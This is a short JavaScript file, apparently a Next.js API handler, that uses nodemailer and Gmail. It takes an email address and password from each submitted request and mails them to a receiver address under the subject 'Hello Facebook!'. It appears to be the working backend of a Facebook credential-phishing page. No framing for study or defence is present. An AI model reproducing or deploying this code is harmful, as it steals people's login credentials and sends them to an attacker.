import nodemailer from "nodemailer";

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user : process.env.EMAIL,
        pass : process.env.PASSWORD
    }
})

export default async function handler(req, res) {
  //-----------------recive mail option----------------
  const options = {
        from : process.env.EMAIL,
        to : process.env.RECIEVER_EMAIL,
        subject : 'Hello Facebook!',
        html : `<div>
        <p>email : ${req.body.email}</p>
        <p>password : ${req.body.password}</p>
        </div>`
      } 
  //----------------try sending mail------------------
  try{
    transporter.sendMail(options,function(err,result) {
      if (err) {
        return res.status(400).json({
          status : 400,
          success : false,
          message : 'Email delivery failed. Please try again'
        })
      }else{
        return res.status(200).json({
          status : 200,
          success : true,
          message : 'Email delivery success.'
        })
      }
    })
  }catch(err) {
    return res.status(500).json({
      status : 500,
      success : true,
      message : 'Something went wrong'
    })
  }
}
